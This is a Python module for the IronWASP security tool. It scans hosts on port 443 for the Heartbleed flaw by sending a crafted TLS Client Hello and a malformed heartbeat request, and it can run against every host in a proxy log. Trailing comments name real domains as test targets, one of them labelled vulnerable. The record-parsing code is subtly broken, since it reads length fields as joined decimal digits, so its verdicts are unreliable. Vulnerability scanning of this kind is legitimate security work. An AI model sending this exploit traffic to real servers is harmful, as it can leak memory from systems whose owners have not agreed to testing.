from IronWASP import *
import re


#Extend the Module base class
class HearbleedScanner(Module):

  #Implement the StartModule method of Module class. This is the method called by IronWASP when user tries to launch the moduule from the UI.
  def StartModule(self):
    #IronConsole is a CLI window where output can be printed and user input accepted
    self.console = IronConsole()
    self.console.SetTitle('HearbleedScanner')
    #Add an event handler to the close event of the console so that the module can be terminated when the user closes the console
    self.console.ConsoleClosing += lambda e: self.close_console(e)
    self.console.ShowConsole()
    #'PrintLine' prints text at the CLI. 'Print' prints text without adding a newline at the end.
    self.console.PrintLine('[*] HearbleedScanner has started')	
    self.ShowMenu()

  def close_console(self, e):
    #This method terminates the main thread on which the module is running
    self.StopModule()

  #Implement the StartModule method of Module class. This is the method called by IronWASP when user tries to launch the moduule from the UI.
  def ShowMenu(self):
    ans=True
    while ans:
      self.console.PrintLine("")
      self.console.PrintLine("")
      self.console.PrintLine("")
      self.console.PrintLine("$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$ MAIN MENU $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$")
      self.console.PrintLine("1.Scan a single url")
      self.console.PrintLine("2.Scan url from proxy log")
      self.console.PrintLine("3.Scan urls from proxy log range")
      self.console.PrintLine("4. Scan all urls from proxy log")
      self.console.PrintLine("5.Exit/Quit")
      self.console.PrintLine("")
      self.console.PrintLine("What would you like to do? ")
      ans=self.console.ReadLine()
      if ans=="1":
        self.console.PrintLine("\n Scan a single url")
        self.console.Print(r"[*]Enter a valid url without 'http(s)://www.' tag. Example: for 'https://www.google.com', enter 'google.com'")
        #'ReadLine' accepts a single line input from the user through the CLI. 'Read' accepts multi-line input.
        url = self.console.ReadLine()
        self.console.PrintLine("\n[*] TARGET URL - " + url)
        #self.console.PrintLine(url)
        self.heartBleedScan(url)
      elif ans=="2":
        self.console.PrintLine("\n Enter proxy log id")
        logId = int(self.console.ReadLine())
        self.scanFromProxyLog(logId)
      elif ans=="3":
        self.console.PrintLine("\n Scan urls from proxy log range")
        self.console.PrintLine("\n Enter starting proxy log id")
        startLogId = int(self.console.ReadLine())
        if startLogId < 0 :
          self.console.PrintLine("Invalid Starting ID. Setting it to 0")
          startLogId = 0;
        self.console.PrintLine("\n Enter ending proxy log id")
        endLogId = int(self.console.ReadLine())
        if endLogId > Config.LastProxyLogId :
          self.console.PrintLine("Invalid end proxy ID. Setting it last proxy id -> " + str(Config.LastProxyLogId))
          endLogId = Config.LastProxyLogId;
        self.scanFromProxyLogRange(startLogId, endLogId)
      elif ans=="4":
        self.console.PrintLine("\n Scan all urls from proxy log") 
        self.scanFromProxyLogRange(0, Config.LastProxyLogId)
      elif ans=="5":
        self.console.PrintLine("\n Goodbye") 
        ans = None
      else:
        self.console.PrintLine("\n Not Valid Choice Try again")

  def hexdump2(self,byteArray):
    for b in xrange(0, len(byteArray), 80):
      start = b + 5
      end = b + 80
      if(b+80 > len(byteArray)) :
        end = len(byteArray)
      hxdat=''
      pdat =''
      for i in range(start, end):
        c = byteArray[i]
        hxdat += ' '.join('%02X' % c)
      self.console.PrintLine('Hexdump2 -> %04x: %-48s' % (b, hxdat))
    print

  def recvall(self,byteArray, start, length):
    rdata = ""
    length = int(length)
    end = start+ length -1
    if(len(byteArray) < end) :
      end = len(byteArray)
    for i in range(start, end):
      data = str(byteArray[i])
      rdata += data
    return rdata


  def recvmsg(self,byteArray, start):
    if byteArray is None or len(byteArray)<= 0 :
      self.console.PrintLine('Unexpected EOF receiving record header - server closed connection')
      return None, None, None
    typ = byteArray[start]
    ver = "0"
    if byteArray[1] > 9 :
      ver = str(byteArray[1])
    else :
      ver = ver + str(byteArray[1])

    if byteArray[2] > 9 :
      ver = ver + str(byteArray[2])
    else :
      ver = ver + "0" + str(byteArray[2])

    ln = "0"
    if byteArray[3] > 9 :
      ln = str(byteArray[3])
    else :
      ln = ln + str(byteArray[3])

    if byteArray[4] > 9 :
      ln = ln + str(byteArray[4])
    else :
      ln = ln + "0" + str(byteArray[4])

    pay = self.recvall(byteArray, 5, ln)
  
    if pay is None:
      self.console.PrintLine('Unexpected EOF receiving record payload - server closed connection')
      return None, None, None
    #self.console.PrintLine(" ... received message: type = " + str(typ) +  ", ver = " + ver + ", length = " + str(int(ln)))
  
    return typ, ver, pay

  def hit_hb(self,byteArray, target):
    typ, ver, pay = self.recvmsg(byteArray,0)
    if typ is None:
      self.console.PrintLine('No heartbeat response received, server likely not vulnerable')
      return False

    if typ == 24:
      self.console.PrintLine('Received heartbeat response:')
      if len(pay) > 3:
        self.console.PrintLine("\n\n################################################################################################")
        self.console.PrintLine("\n\n####################### ALERT: SERVER RETURNED MORE DATA THAN IT SHOULD. SERVER IS VULNERABLE!")
        self.console.PrintLine("\n\n####################### SERVER - " + target)
        self.console.PrintLine("\n\n################################################################################################")
      else:
        self.console.PrintLine('Server processed malformed heartbeat, but did not return any extra data.')
      return True

    if typ == 21:
      self.console.PrintLine('Received alert:')
      self.hexdump2(pay)
      self.console.PrintLine('Server returned error, likely not vulnerable')
      return False
    self.console.PrintLine('Server is likely not vulnerable')
    return False

  def heartBleedScan(self,target):
    sleepTime = 5000
    hexmessage = " 16 03 02 00 dc 01 00 00 d8 03 02 53 43 5b 90 9d 9b 72 0b bc 0c bc 2b 92 a8 48 97 cf bd 39 04 cc 16 0a 85 03 90 9f 77 04 33 d4 de 00 00 66 c0 14 c0 0a c0 22 c0 21 00 39 00 38 00 88 00 87 c0 0f c0 05 00 35 00 84 c0 12 c0 08 c0 1c c0 1b 00 16 00 13 c0 0d c0 03 00 0a c0 13 c0 09 c0 1f c0 1e 00 33 00 32 00 9a 00 99 00 45 00 44 c0 0e c0 04 00 2f 00 96 00 41 c0 11 c0 07 c0 0c c0 02 00 05 00 04 00 15 00 12 00 09 00 14 00 11 00 08 00 06 00 03 00 ff 01 00 00 49 00 0b 00 04 03 00 01 02 00 0a 00 34 00 32 00 0e 00 0d 00 19 00 0b 00 0c 00 18 00 09 00 0a 00 16 00 17 00 08 00 06 00 07 00 14 00 15 00 04 00 05 00 12 00 13 00 01 00 02 00 03 00 0f 00 10 00 11 00 23 00 00 00 0f 00 01 01"
    hello1 = Tools.HexToBytes(hexmessage.replace(" ", "%"))
    hb = Tools.HexToBytes(" 18 03 02 00 03 01 FF FF".replace(" ", "%"))

    self.console.PrintLine("\n\nConnecting -> " + target)
  
    try:
      s = TcpSocket(target, 443)
    except:
      self.console.PrintLine("Connection Error... Invalid server address or port")
      return

    self.console.PrintLine('Sending Client Hello...')
    s.Write(hello1)

    self.console.PrintLine('Waiting for Server Hello...')
    #byteArray = s.WaitAndRead()
    IronThread.Sleep(sleepTime)
    byteArray = s.Read()
  
    typ, ver, pay = self.recvmsg(byteArray,0)
    if typ == None:
      self.console.PrintLine('Server closed connection without sending Server Hello.')
      return
    # Look for server hello done message.
    if typ == 22:
      self.console.PrintLine("HELLO SUCCESSFUL")
      self.console.PrintLine('Sending heartbeat request...')
      s.Write(hb)
      #byteArray = s.WaitAndRead()
      IronThread.Sleep(sleepTime)
      byteArray = s.Read()
      self.console.PrintLine('Analyzing heartbeat response...')
      self.hit_hb(byteArray, target)
      self.console.PrintLine("DONE...")

  #Implement the GetInstance method of Module class. This method is used to create new instances of this module.
  def GetInstance(self):
    m = HearbleedScanner()
    m.Name = 'HearbleedScanner'
    return m

  def scanFromProxyLog(self, logId):
    try: 
      url = Request.FromProxyLog(logId).BaseUrl
      list =  url.split("/")
      url = list[len(list)-2]
      self.console.PrintLine("\n[*] TARGET URL - " + url)
      self.heartBleedScan(url)
    except:
      self.console.PrintLine("Invalid Log ID -> " + str(logId))	  
	  
  def scanFromProxyLogRange(self, startLogId, endLogId):
    uniqueUrls = self.FilterUniqueURLsFromProxyLog(startLogId, endLogId)
    for i in range(0, len(uniqueUrls)):
      self.heartBleedScan(uniqueUrls[i])
	  
  def FilterUniqueURLsFromProxyLog(self, startLogId, endLogId):
    temp_list=[]
    for i in range(startLogId, endLogId):
      sess = Session.FromProxyLog(i+1)
      temp_list.append(sess.Request.BaseUrl)
    filtered_list = self.FilterDuplicateURLs(temp_list)

    self.console.PrintLine( "\n########### NUMBER OF URL FOUND -> " + str(len(filtered_list)))
    self.console.PrintLine( filtered_list)
    return filtered_list
	  
  def StripHTTPStrings(self, href):
    http="http://"
    https="https://"
    www="www."
    if(href.find(http) >= 0):
      href = href[href.find(http) + len(http):]
    if(href.find(https) >= 0):
      href = href[href.find(https) + len(https):]
    if(href.find(www) >= 0):
      href = href[href.find(www) + len(www):]
    return href

  def FilterDuplicateURLs(self, hrefs, excludeURLList=[]):
    seen = set();
    result = [];
    for href in hrefs:
      if(self.UrlNotInExcludeList(href, excludeURLList)):
        req = Request(href)
        if (req != None and req.BaseUrl != None):
          url=self.StripHTTPStrings(href)
          url = url.strip()
          url = url.strip("/")
          if len(url) > 2 and url not in seen:
            seen.add(url);
            result.append(url);
    return result;

  def UrlNotInExcludeList(self, href, excludeURLList):
    for badURL in excludeURLList:
      if(badURL in href):
        return False
    return True


#This code is executed only once when this new module is loaded in to the memory.
#Create an instance of the this module
m = HearbleedScanner()
#Call the GetInstance method on this instance which will return a new instance with all the approriate values filled in. Add this new instance to the list of Modules
Module.Add(m.GetInstance())

################ TEST DATA ################
#heartBleedScan("fpsc.gov.pk")   #VULNERABLE
#heartBleedScan("irctc.co.in")   # HTTPS BUT NOT VULNERABLE
#heartBleedScan("ebay.com")      # NO HTTPS

